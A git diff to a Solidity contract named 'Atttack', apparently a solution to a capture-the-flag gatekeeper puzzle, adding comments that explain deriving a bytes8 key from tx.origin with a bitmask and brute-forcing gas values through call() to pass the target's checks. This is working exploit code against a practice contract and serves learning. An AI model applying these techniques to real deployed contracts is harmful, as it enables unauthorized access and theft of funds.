@@ -14,9 +14,15 @@ contract Atttack {
     }
 
     function attack() public {
+        // gateThree: 1. cast address into uint160 (since address is 160 bits long)
+        // gateThree: 2. cast uint160 into uint64 (since the key passed into the function is bytes8 = 64 bits long)
+        // gateThree: 3. perform AND bitwise operation with the mask then cast the result into bytes8 
         bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
+
+        // gateTwo: iterate through an additional gas amounts from 0 to 8190 until (8191*3+i)-gasUsed % 8191 = 0
         for (uint256 i = 0; i < 8191; ++i) {
-            // target.enter{gas: 8191*3+i}(key); -> will revert!
+            // gateTwo: target.enter{gas: 8191*3+i}(key); -> will revert!
+            // gateTwo: Use call() to handle function call instead
             (bool success, ) = target.call{gas: 8191*3+i}(
                 abi.encodeWithSignature("enter(bytes8)", key)
             );
